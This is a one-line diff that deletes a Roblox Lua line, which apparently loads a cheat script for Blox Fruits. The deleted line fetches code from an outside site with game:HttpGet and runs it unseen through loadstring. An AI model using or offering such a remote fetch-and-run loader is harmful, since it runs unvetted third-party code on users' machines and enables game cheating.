@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://kidachi.xyz/Bloxfruit', true))()
